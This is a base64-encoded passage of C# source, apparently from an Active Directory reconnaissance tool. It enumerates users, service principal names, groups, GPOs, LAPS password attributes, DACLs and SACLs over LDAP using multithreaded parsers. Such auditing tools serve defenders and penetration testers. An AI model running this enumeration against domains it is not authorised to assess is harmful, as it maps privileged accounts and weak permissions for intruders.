HJpbmcsIFN0cmluZz4oKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgRG9tYWluU0lEOwogICAgICAgIHByaXZhdGUgc3RhdGljIERpY3Rpb25hcnk8U3RyaW5nLCBTdHJpbmc+IEFkR1BPRGljdGlvbmFyeSA9IG5ldyBEaWN0aW9uYXJ5PFN0cmluZywgU3RyaW5nPigpOwogICAgICAgIHByaXZhdGUgc3RhdGljIEhhc2h0YWJsZSBHVUlEcyA9IG5ldyBIYXNodGFibGUoKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyBEaWN0aW9uYXJ5PFN0cmluZywgU3RyaW5nPiBBZFNJRERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4oKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyByZWFkb25seSBIYXNoU2V0PHN0cmluZz4gR3JvdXBzID0gbmV3IEhhc2hTZXQ8c3RyaW5nPiAoIG5ldyBTdHJpbmdbXSB7IjI2ODQzNTQ1NiIsICIyNjg0MzU0NTciLCAiNTM2ODcwOTEyIiwgIjUzNjg3MDkxMyJ9ICk7CiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgcmVhZG9ubHkgSGFzaFNldDxzdHJpbmc+IFVzZXJzID0gbmV3IEhhc2hTZXQ8c3RyaW5nPiAoIG5ldyBTdHJpbmdbXSB7ICI4MDUzMDYzNjgiIH0gKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyByZWFkb25seSBIYXNoU2V0PHN0cmluZz4gQ29tcHV0ZXJzID0gbmV3IEhhc2hTZXQ8c3RyaW5nPiAoIG5ldyBTdHJpbmdbXSB7ICI4MDUzMDYzNjkiIH0pIDsKICAgICAgICBwcml2YXRlIHN0YXRpYyByZWFkb25seSBIYXNoU2V0PHN0cmluZz4gVHJ1c3RBY2NvdW50cyA9IG5ldyBIYXNoU2V0PHN0cmluZz4gKCBuZXcgU3RyaW5nW10geyAiODA1MzA2MzcwIiB9ICk7CgogICAgICAgIFtGbGFnc10KICAgICAgICAvL1ZhbHVlcyB0YWtlbiBmcm9tIGh0dHBzOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2VuLWF1L2tiLzMwNTE0NAogICAgICAgIHB1YmxpYyBlbnVtIFVBQ0ZsYWdzCiAgICAgICAgewogICAgICAgICAgICBTQ1JJUFQgPSAxLCAgICAgICAgLy8gMHgxCiAgICAgICAgICAgIEFDQ09VTlRESVNBQkxFID0gMiwgICAgICAgIC8vIDB4MgogICAgICAgICAgICBIT01FRElSX1JFUVVJUkVEID0gOCwgICAgICAgIC8vIDB4OAogICAgICAgICAgICBMT0NLT1VUID0gMTYsICAgICAgIC8vIDB4MTAKICAgICAgICAgICAgUEFTU1dEX05PVFJFUUQgPSAzMiwgICAgICAgLy8gMHgyMAogICAgICAgICAgICBQQVNTV0RfQ0FOVF9DSEFOR0UgPSA2NCwgICAgICAgLy8gMHg0MAogICAgICAgICAgICBFTkNSWVBURURfVEVYVF9QQVNTV09SRF9BTExPV0VEID0gMTI4LCAgICAgIC8vIDB4ODAKICAgICAgICAgICAgVEVNUF9EVVBMSUNBVEVfQUNDT1VOVCA9IDI1NiwgICAgICAvLyAweDEwMAogICAgICAgICAgICBOT1JNQUxfQUNDT1VOVCA9IDUxMiwgICAgICAvLyAweDIwMAogICAgICAgICAgICBJTlRFUkRPTUFJTl9UUlVTVF9BQ0NPVU5UID0gMjA0OCwgICAgIC8vIDB4ODAwCiAgICAgICAgICAgIFdPUktTVEFUSU9OX1RSVVNUX0FDQ09VTlQgPSA0MDk2LCAgICAgLy8gMHgxMDAwCiAgICAgICAgICAgIFNFUlZFUl9UUlVTVF9BQ0NPVU5UID0gODE5MiwgICAgIC8vIDB4MjAwMAogICAgICAgICAgICBET05UX0VYUElSRV9QQVNTV0QgPSA2NTUzNiwgICAgLy8gMHgxMDAwMAogICAgICAgICAgICBNTlNfTE9HT05fQUNDT1VOVCA9IDEzMTA3MiwgICAvLyAweDIwMDAwCiAgICAgICAgICAgIFNNQVJUQ0FSRF9SRVFVSVJFRCA9IDI2MjE0NCwgICAvLyAweDQwMDAwCiAgICAgICAgICAgIFRSVVNURURfRk9SX0RFTEVHQVRJT04gPSA1MjQyODgsICAgLy8gMHg4MDAwMAogICAgICAgICAgICBOT1RfREVMRUdBVEVEID0gMTA0ODU3NiwgIC8vIDB4MTAwMDAwCiAgICAgICAgICAgIFVTRV9ERVNfS0VZX09OTFkgPSAyMDk3MTUyLCAgLy8gMHgyMDAwMDAKICAgICAgICAgICAgRE9OVF9SRVFVSVJFX1BSRUFVVEggPSA0MTk0MzA0LCAgLy8gMHg0MDAwMDAKICAgICAgICAgICAgUEFTU1dPUkRfRVhQSVJFRCA9IDgzODg2MDgsICAvLyAweDgwMDAwMAogICAgICAgICAgICBUUlVTVEVEX1RPX0FVVEhFTlRJQ0FURV9GT1JfREVMRUdBVElPTiA9IDE2Nzc3MjE2LCAvLyAweDEwMDAwMDAKICAgICAgICAgICAgUEFSVElBTF9TRUNSRVRTX0FDQ09VTlQgPSA2NzEwODg2NCAvLyAweDA0MDAwMDAwCiAgICAgICAgfQoKICAgICAgICBbRmxhZ3NdCiAgICAgICAgLy9WYWx1ZXMgdGFrZW4gZnJvbSBodHRwczovL2Jsb2dzLm1zZG4ubWljcm9zb2Z0LmNvbS9vcGVuc3BlY2lmaWNhdGlvbi8yMDExLzA1LzMwL3dpbmRvd3MtY29uZmlndXJhdGlvbnMtZm9yLWtlcmJlcm9zLXN1cHBvcnRlZC1lbmNyeXB0aW9uLXR5cGUvCiAgICAgICAgcHVibGljIGVudW0gS2VyYkVuY0ZsYWdzCiAgICAgICAgewogICAgICAgICAgICBaRVJPID0gMCwKICAgICAgICAgICAgREVTX0NCQ19DUkMgPSAxLCAgICAgICAgLy8gMHgxCiAgICAgICAgICAgIERFU19DQkNfTUQ1ID0gMiwgICAgICAgIC8vIDB4MgogICAgICAgICAgICBSQzRfSE1BQyA9IDQsICAgICAgICAvLyAweDQKICAgICAgICAgICAgQUVTMTI4X0NUU19ITUFDX1NIQTFfOTYgPSA4LCAgICAgICAvLyAweDE4CiAgICAgICAgICAgIEFFUzI1Nl9DVFNfSE1BQ19TSEExXzk2ID0gMTYgICAgICAgLy8gMHgxMAogICAgICAgIH0KCiAgICAgICAgW0ZsYWdzXQogICAgICAgIC8vVmFsdWVzIHRha2VuIGZyb20gaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tYXUva2IvMzA1MTQ0CiAgICAgICAgcHVibGljIGVudW0gR3JvdXBUeXBlRmxhZ3MKICAgICAgICB7CiAgICAgICAgICAgIEdMT0JBTF9HUk9VUCAgICAgICA9IDIsICAgICAgICAgICAgLy8gMHgwMDAwMDAwMgogICAgICAgICAgICBET01BSU5fTE9DQUxfR1JPVVAgPSA0LCAgICAgICAgICAgIC8vIDB4MDAwMDAwMDQKICAgICAgICAgICAgTE9DQUxfR1JPVVAgICAgICAgID0gNCwgICAgICAgICAgICAvLyAweDAwMDAwMDA0CiAgICAgICAgICAgIFVOSVZFUlNBTF9HUk9VUCAgICA9IDgsICAgICAgICAgICAgLy8gMHgwMDAwMDAwOAogICAgICAgICAgICBTRUNVUklUWV9FTkFCTEVEICAgPSAtMjE0NzQ4MzY0OCAgIC8vIDB4ODAwMDAwMDAKICAgICAgICB9CgoJCXByaXZhdGUgc3RhdGljIHJlYWRvbmx5IERpY3Rpb25hcnk8U3RyaW5nLCBTdHJpbmc+IFJlcGxhY2VtZW50cyA9IG5ldyBEaWN0aW9uYXJ5PFN0cmluZywgU3RyaW5nPigpCiAgICAgICAgewogICAgICAgICAgICAvL3tTeXN0ZW0uRW52aXJvbm1lbnQuTmV3TGluZSwgIiJ9LAogICAgICAgICAgICAvL3siLCIsICI7In0sCiAgICAgICAgICAgIHsiXCIiLCAiJyJ9CiAgICAgICAgfTsKCiAgICAgICAgcHVibGljIHN0YXRpYyBTdHJpbmcgQ2xlYW5TdHJpbmcoT2JqZWN0IFN0cmluZ3RvQ2xlYW4pCiAgICAgICAgewogICAgICAgICAgICAvLyBSZW1vdmUgZXh0cmEgc3BhY2VzIGFuZCBuZXcgbGluZXMKICAgICAgICAgICAgU3RyaW5nIENsZWFuZWRTdHJpbmcgPSBTdHJpbmcuSm9pbigiICIsICgoQ29udmVydC5Ub1N0cmluZyhTdHJpbmd0b0NsZWFuKSkuU3BsaXQoKHN0cmluZ1tdKSBudWxsLCBTdHJpbmdTcGxpdE9wdGlvbnMuUmVtb3ZlRW1wdHlFbnRyaWVzKSkpOwogICAgICAgICAgICBmb3JlYWNoIChTdHJpbmcgUmVwbGFjZW1lbnQgaW4gUmVwbGFjZW1lbnRzLktleXMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENsZWFuZWRTdHJpbmcgPSBDbGVhbmVkU3RyaW5nLlJlcGxhY2UoUmVwbGFjZW1lbnQsIFJlcGxhY2VtZW50c1tSZXBsYWNlbWVudF0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBDbGVhbmVkU3RyaW5nOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgT2JqZWN0Q291bnQoT2JqZWN0W10gQURST2JqZWN0KQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuIEFEUk9iamVjdC5MZW5ndGg7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgTEFQU0NoZWNrKE9iamVjdFtdIEFkQ29tcHV0ZXJzKQogICAgICAgIHsKICAgICAgICAgICAgYm9vbCBMQVBTID0gZmFsc2U7CiAgICAgICAgICAgIGZvcmVhY2ggKFNlYXJjaFJlc3VsdCBBZENvbXB1dGVyIGluIEFkQ29tcHV0ZXJzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJtcy1tY3MtYWRtcHdkZXhwaXJhdGlvbnRpbWUiXS5Db3VudCA9PSAxKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIExBUFMgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBMQVBTOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBMQVBTOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBVc2VyUGFyc2VyKE9iamVjdFtdIEFkVXNlcnMsIERhdGVUaW1lIERhdGUxLCBpbnQgRG9ybWFudFRpbWVTcGFuLCBpbnQgUGFzc01heEFnZSwgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIExEQVBDbGFzcy5EYXRlMSA9IERhdGUxOwogICAgICAgICAgICBMREFQQ2xhc3MuRG9ybWFudFRpbWVTcGFuID0gRG9ybWFudFRpbWVTcGFuOwogICAgICAgICAgICBMREFQQ2xhc3MuUGFzc01heEFnZSA9IFBhc3NNYXhBZ2U7CgogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQWRVc2VycywgbnVtT2ZUaHJlYWRzLCAiVXNlcnMiKTsKICAgICAgICAgICAgcmV0dXJuIEFEUk9iajsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gVXNlclNQTlBhcnNlcihPYmplY3RbXSBBZFVzZXJzLCBpbnQgbnVtT2ZUaHJlYWRzKQogICAgICAgIHsKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkVXNlcnMsIG51bU9mVGhyZWFkcywgIlVzZXJTUE5zIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIEdyb3VwUGFyc2VyKE9iamVjdFtdIEFkR3JvdXBzLCBpbnQgbnVtT2ZUaHJlYWRzKQogICAgICAgIHsKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkR3JvdXBzLCBudW1PZlRocmVhZHMsICJHcm91cHMiKTsKICAgICAgICAgICAgcmV0dXJuIEFEUk9iajsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gR3JvdXBNZW1iZXJQYXJzZXIoT2JqZWN0W10gQWRHcm91cHMsIE9iamVjdFtdIEFkR3JvdXBNZW1iZXJzLCBTdHJpbmcgRG9tYWluU0lELCBpbnQgbnVtT2ZUaHJlYWRzKQogICAgICAgIHsKICAgICAgICAgICAgTERBUENsYXNzLkFkR3JvdXBEaWN0aW9uYXJ5ID0gbmV3IERpY3Rpb25hcnk8U3RyaW5nLCBTdHJpbmc+KCk7CiAgICAgICAgICAgIHJ1blByb2Nlc3NvcihBZEdyb3VwcywgbnVtT2ZUaHJlYWRzLCAiR3JvdXBzRGljdGlvbmFyeSIpOwogICAgICAgICAgICBMREFQQ2xhc3MuRG9tYWluU0lEID0gRG9tYWluU0lEOwogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQWRHcm91cE1lbWJlcnMsIG51bU9mVGhyZWFkcywgIkdyb3VwTWVtYmVycyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBPVVBhcnNlcihPYmplY3RbXSBBZE9VcywgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIE9iamVjdFtdIEFEUk9iaiA9IHJ1blByb2Nlc3NvcihBZE9VcywgbnVtT2ZUaHJlYWRzLCAiT1VzIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIEdQT1BhcnNlcihPYmplY3RbXSBBZEdQT3MsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQWRHUE9zLCBudW1PZlRocmVhZHMsICJHUE9zIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIFNPTVBhcnNlcihPYmplY3RbXSBBZEdQT3MsIE9iamVjdFtdIEFkU09NcywgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIExEQVBDbGFzcy5BZEdQT0RpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4oKTsKICAgICAgICAgICAgcnVuUHJvY2Vzc29yKEFkR1BPcywgbnVtT2ZUaHJlYWRzLCAiR1BPc0RpY3Rpb25hcnkiKTsKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkU09NcywgbnVtT2ZUaHJlYWRzLCAiU09NcyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBQcmludGVyUGFyc2VyKE9iamVjdFtdIEFEUHJpbnRlcnMsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQURQcmludGVycywgbnVtT2ZUaHJlYWRzLCAiUHJpbnRlcnMiKTsKICAgICAgICAgICAgcmV0dXJuIEFEUk9iajsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gQ29tcHV0ZXJQYXJzZXIoT2JqZWN0W10gQWRDb21wdXRlcnMsIERhdGVUaW1lIERhdGUxLCBpbnQgRG9ybWFudFRpbWVTcGFuLCBpbnQgUGFzc01heEFnZSwgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIExEQVBDbGFzcy5EYXRlMSA9IERhdGUxOwogICAgICAgICAgICBMREFQQ2xhc3MuRG9ybWFudFRpbWVTcGFuID0gRG9ybWFudFRpbWVTcGFuOwogICAgICAgICAgICBMREFQQ2xhc3MuUGFzc01heEFnZSA9IFBhc3NNYXhBZ2U7CgogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQWRDb21wdXRlcnMsIG51bU9mVGhyZWFkcywgIkNvbXB1dGVycyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBDb21wdXRlclNQTlBhcnNlcihPYmplY3RbXSBBZENvbXB1dGVycywgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIE9iamVjdFtdIEFEUk9iaiA9IHJ1blByb2Nlc3NvcihBZENvbXB1dGVycywgbnVtT2ZUaHJlYWRzLCAiQ29tcHV0ZXJTUE5zIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIExBUFNQYXJzZXIoT2JqZWN0W10gQWRDb21wdXRlcnMsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBPYmplY3RbXSBBRFJPYmogPSBydW5Qcm9jZXNzb3IoQWRDb21wdXRlcnMsIG51bU9mVGhyZWFkcywgIkxBUFMiKTsKICAgICAgICAgICAgcmV0dXJuIEFEUk9iajsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gREFDTFBhcnNlcihPYmplY3RbXSBBRE9iamVjdHMsIE9iamVjdCBQU0dVSURzLCBpbnQgbnVtT2ZUaHJlYWRzKQogICAgICAgIHsKICAgICAgICAgICAgTERBUENsYXNzLkFkU0lERGljdGlvbmFyeSA9IG5ldyBEaWN0aW9uYXJ5PFN0cmluZywgU3RyaW5nPigpOwogICAgICAgICAgICBydW5Qcm9jZXNzb3IoQURPYmplY3RzLCBudW1PZlRocmVhZHMsICJTSUREaWN0aW9uYXJ5Iik7CiAgICAgICAgICAgIExEQVBDbGFzcy5HVUlEcyA9IChIYXNodGFibGUpIFBTR1VJRHM7CiAgICAgICAgICAgIE9iamVjdFtdIEFEUk9iaiA9IHJ1blByb2Nlc3NvcihBRE9iamVjdHMsIG51bU9mVGhyZWFkcywgIkRBQ0xzIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIFNBQ0xQYXJzZXIoT2JqZWN0W10gQURPYmplY3RzLCBPYmplY3QgUFNHVUlEcywgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIExEQVBDbGFzcy5HVUlEcyA9IChIYXNodGFibGUpIFBTR1VJRHM7CiAgICAgICAgICAgIE9iamVjdFtdIEFEUk9iaiA9IHJ1blByb2Nlc3NvcihBRE9iamVjdHMsIG51bU9mVGhyZWFkcywgIlNBQ0xzIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBzdGF0aWMgT2JqZWN0W10gcnVuUHJvY2Vzc29yKE9iamVjdFtdIGFycmF5VG9Qcm9jZXNzLCBpbnQgbnVtT2ZUaHJlYWRzLCBzdHJpbmcgcHJvY2Vzc29yVHlwZSkKICAgICAgICB7CiAgICAgICAgICAgIGludCB0b3RhbFJlY29yZHMgPSBhcnJheVRvUHJvY2Vzcy5MZW5ndGg7CiAgICAgICAgICAgIElSZWNvcmRQcm9jZXNzb3IgcmVjb3JkUHJvY2Vzc29yID0gcmVjb3JkUHJvY2Vzc29yRmFjdG9yeShwcm9jZXNzb3JUeXBlKTsKICAgICAgICAgICAgSVJlc3VsdHNIYW5kbGVyIHJlc3VsdHNIYW5kbGVyID0gbmV3IFNpbXBsZVJlc3VsdHNIYW5kbGVyICgpOwogICAgICAgICAgICBpbnQgbnVtYmVyT2ZSZWNvcmRzUGVyVGhyZWFkID0gdG90YWxSZWNvcmRzIC8gbnVtT2ZUaHJlYWRzOwogICAgICAgICAgICBpbnQgcmVtYWluZGVycyA9IHRvdGFsUmVjb3JkcyAlIG51bU9mVGhyZWFkczsKCiAgICAgICAgICAgIFRocmVhZFtdIHRocmVhZHMgPSBuZXcgVGhyZWFkW251bU9mVGhyZWFkc107CiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgbnVtT2ZUaHJlYWRzOyBpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGludCBudW1iZXJPZlJlY29yZHNUb1Byb2Nlc3MgPSBudW1iZXJPZlJlY29yZHNQZXJUaHJlYWQ7CiAgICAgICAgICAgICAgICBpZiAoaSA9PSAobnVtT2ZUaHJlYWRzIC0gMSkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgLy9sYXN0IHRocmVhZCwgZG8gdGhlIHJlbWFpbmluZyByZWNvcmRzCiAgICAgICAgICAgICAgICAgICAgbnVtYmVyT2ZSZWNvcmRzVG9Qcm9jZXNzICs9IHJlbWFpbmRlcnM7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgLy9zcGxpdCB0aGUgZnVsbCBhcnJheSBpbnRvIGNodW5rcyB0byBiZSBnaXZlbiB0byBkaWZmZXJlbnQgdGhyZWFkcwogICAgICAgICAgICAgICAgT2JqZWN0W10gc2xpY2VUb1Byb2Nlc3MgPSBuZXcgT2JqZWN0W251bWJlck9mUmVjb3Jkc1RvUHJvY2Vzc107CiAgICAgICAgICAgICAgICBBcnJheS5Db3B5KGFycmF5VG9Qcm9jZXNzLCBpICogbnVtYmVyT2ZSZWNvcmRzUGVyVGhyZWFkLCBzbGljZVRvUHJvY2VzcywgMCwgbnVtYmVyT2ZSZWNvcmRzVG9Qcm9jZXNzKTsKICAgICAgICAgICAgICAgIFByb2Nlc3NvclRocmVhZCBwcm9jZXNzb3JUaHJlYWQgPSBuZXcgUHJvY2Vzc29yVGhyZWFkKGksIHJlY29yZFByb2Nlc3NvciwgcmVzdWx0c0hhbmRsZXIsIHNsaWNlVG9Qcm9jZXNzKTsKICAgICAgICAgICAgICAgIHRocmVhZHNbaV0gPSBuZXcgVGhyZWFkKHByb2Nlc3NvclRocmVhZC5wcm9jZXNzVGhyZWFkUmVjb3Jkcyk7CiAgICAgICAgICAgICAgICB0aHJlYWRzW2ldLlN0YXJ0KCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZm9yZWFjaCAoVGhyZWFkIHQgaW4gdGhyZWFkcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdC5Kb2luKCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHJldHVybiByZXN1bHRzSGFuZGxlci5maW5hbGlzZSgpOwogICAgICAgIH0KCiAgICAgICAgc3RhdGljIElSZWNvcmRQcm9jZXNzb3IgcmVjb3JkUHJvY2Vzc29yRmFjdG9yeShTdHJpbmcgbmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAobmFtZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgY2FzZSAiVXNlcnMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgVXNlclJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiVXNlclNQTnMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgVXNlclNQTlJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiR3JvdXBzIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEdyb3VwUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJHcm91cHNEaWN0aW9uYXJ5IjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEdyb3VwUmVjb3JkRGljdGlvbmFyeVByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiR3JvdXBNZW1iZXJzIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEdyb3VwTWVtYmVyUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJPVXMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgT1VSZWNvcmRQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIkdQT3MiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgR1BPUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJHUE9zRGljdGlvbmFyeSI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBHUE9SZWNvcmREaWN0aW9uYXJ5UHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJTT01zIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFNPTVJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiUHJpbnRlcnMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJpbnRlclJlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiQ29tcHV0ZXJzIjoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IENvbXB1dGVyUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJDb21wdXRlclNQTnMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgQ29tcHV0ZXJTUE5SZWNvcmRQcm9jZXNzb3IoKTsKICAgICAgICAgICAgICAgIGNhc2UgIkxBUFMiOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgTEFQU1JlY29yZFByb2Nlc3NvcigpOwogICAgICAgICAgICAgICAgY2FzZSAiU0lERGljdGlvbmFyeSI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBTSURSZWNvcmREaWN0aW9uYXJ5UHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJEQUNMcyI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBEQUNMUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgICAgICBjYXNlICJTQUNMcyI6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBTQUNMUmVjb3JkUHJvY2Vzc29yKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdGhyb3cgbmV3IEFyZ3VtZW50RXhjZXB0aW9uKCJJbnZhbGlkIHByb2Nlc3NvciB0eXBlICIgKyBuYW1lKTsKICAgICAgICB9CgogICAgICAgIGNsYXNzIFByb2Nlc3NvclRocmVhZAogICAgICAgIHsKICAgICAgICAgICAgcmVhZG9ubHkgaW50IGlkOwogICAgICAgICAgICByZWFkb25seSBJUmVjb3JkUHJvY2Vzc29yIHJlY29yZFByb2Nlc3NvcjsKICAgICAgICAgICAgcmVhZG9ubHkgSVJlc3VsdHNIYW5kbGVyIHJlc3VsdHNIYW5kbGVyOwogICAgICAgICAgICByZWFkb25seSBPYmplY3RbXSBvYmplY3RzVG9CZVByb2Nlc3NlZDsKCiAgICAgICAgICAgIHB1YmxpYyBQcm9jZXNzb3JUaHJlYWQoaW50IGlkLCBJUmVjb3JkUHJvY2Vzc29yIHJlY29yZFByb2Nlc3NvciwgSVJlc3VsdHNIYW5kbGVyIHJlc3VsdHNIYW5kbGVyLCBPYmplY3RbXSBvYmplY3RzVG9CZVByb2Nlc3NlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdGhpcy5yZWNvcmRQcm9jZXNzb3IgPSByZWNvcmRQcm9jZXNzb3I7CiAgICAgICAgICAgICAgICB0aGlzLmlkID0gaWQ7CiAgICAgICAgICAgICAgICB0aGlzLnJlc3VsdHNIYW5kbGVyID0gcmVzdWx0c0hhbmRsZXI7CiAgICAgICAgICAgICAgICB0aGlzLm9iamVjdHNUb0JlUHJvY2Vzc2VkID0gb2JqZWN0c1RvQmVQcm9jZXNzZWQ7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHB1YmxpYyB2b2lkIHByb2Nlc3NUaHJlYWRSZWNvcmRzKCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBvYmplY3RzVG9CZVByb2Nlc3NlZC5MZW5ndGg7IGkrKykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBPYmplY3RbXSByZXN1bHQgPSByZWNvcmRQcm9jZXNzb3IucHJvY2Vzc1JlY29yZChvYmplY3RzVG9CZVByb2Nlc3NlZFtpXSk7CiAgICAgICAgICAgICAgICAgICAgcmVzdWx0c0hhbmRsZXIucHJvY2Vzc1Jlc3VsdHMocmVzdWx0KTsgLy90aGlzIGlzIGEgdGhyZWFkIHNhZmUgb3BlcmF0aW9uCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vVGhlIGludGVyZmFjZSBhbmQgaW1wbG1lbnRhdGlvbiBjbGFzcyB1c2VkIHRvIHByb2Nlc3MgYSByZWNvcmQgKHRoaXMgaW1wbGVtbWVudGF0aW9uIGp1c3QgcmV0dXJucyBhIGxvZyB0eXBlIHN0cmluZykKCiAgICAgICAgaW50ZXJmYWNlIElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIFBTT2JqZWN0